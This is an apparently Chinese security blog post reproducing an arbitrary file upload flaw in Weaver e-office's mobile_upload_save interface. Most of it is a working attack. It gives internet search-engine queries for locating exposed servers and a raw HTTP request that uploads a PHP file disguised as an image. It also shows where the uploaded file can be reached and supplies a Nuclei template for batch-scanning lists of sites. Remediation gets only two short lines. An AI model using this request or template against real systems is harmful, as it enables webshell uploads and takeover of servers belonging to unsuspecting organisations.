#  【漏洞复现 | 含批量POC】泛微e-office-mobile_upload_save 任意文件上传漏洞   
小明同学  小明信安   2024-06-16 09:00  
  
**0x01 免责声明**  
  
disclaimer  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。信息及工具收集于互联网，真实性及安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
**0x02 漏洞介绍**  
  
Vulnerability introduction  
  
    泛微e-officemobile_upload_save接口存在任意文件上传漏洞接口存在任意文件上传漏洞，攻击者可通过该漏洞上传任意文件到服务器上，包括木马后门文件，导致服务器权限被控制。  
  
**0x03 搜索语法**  
  
Search for syntax  
  
- Fofa：  
  
  
```
body="/newplugins/js/pnotify/jquery.pnotify.default.css"
```  
  
- Hunter  
  
  
```
body="/newplugins/js/pnotify/jquery.pnotify.default.css"
```  
  
- Quake  
  
  
```
body="/newplugins/js/pnotify/jquery.pnotify.default.css"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/WfB6o4vicwSJvqt9soChab18HOg5L1vgwJ1VibibP8CjNotrBfl0l9gZfKtTU38qL3Pbiax7jj5aGR4libiaTwLPiaVGg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**0x04 漏洞复现**  
  
Request packets  
  
- 请求接口上传任意文件  
  
```
POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1
Host: your-ip
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close
Content-Length: 350

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="upload_quwan"; filename="1.php."
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/WfB6o4vicwSKsmQmPt7f1Nx2XqlS2lBZ2C5ibfHqjaAYvBBMdFKsFUkBa45Ege3681fNaoKSLcvkJ393ORTpAuJQ/640?wx_fmt=png&from=appmsg "")  
- 文件访问地址为回显中的/attachment/xxxxxx/1.php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/WfB6o4vicwSKsmQmPt7f1Nx2XqlS2lBZ20ibJpHqVADeS4GQT2CNiacPrGZGSX0ed8w4mU5N6o5UPxAVz3SxtYmWQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
**0x05 nuclei POC**  
  
nuclei POC  
  
- Nuclei 批量检测POC  
  
- 所用方法nuclei.exe -l 网址文件.txt -t POC.yaml  
  
```
id: Weaver_e-office_mobile_upload_save_fileupload

info:
  name: Weaver_e-office_mobile_upload_save_fileupload
  author: security-xm
  severity: high
  description: 泛微e-officemobile_upload_save接口存在任意文件上传漏洞接口存在任意文件上传漏洞
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true

http:
- raw:
  - |
    @timeout: 30s
    POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
    Connection: close
    Content-Length: 204

    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
    Content-Disposition: form-data; name="upload_quwan"; filename="1.php."
    Content-Type: image/jpeg

    <?php phpinfo();?>
    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - attachment

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/WfB6o4vicwSKsmQmPt7f1Nx2XqlS2lBZ2pibsvW2cuUwocBkweRgClTEM6SU5jMAMCMC2Rz8xEmgcUooCBNz3nIA/640?wx_fmt=png&from=appmsg "")  
  
  
**0x07 修复建议**  
  
Remediation recommendations  
  
- 在Web应用防火墙中添加接口临时黑名单规则  
  
- 联系厂商打补丁或升级版本。  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/WfB6o4vicwSISMoBvibVByMUlExr9ibqmnwWAbwiaNjO1XPzIHNbfEIfgfSHeJqDSHqIw8pXKSdgic1vSia8HhntX5lw/640?wx_fmt=gif&from=appmsg "")  
  
  
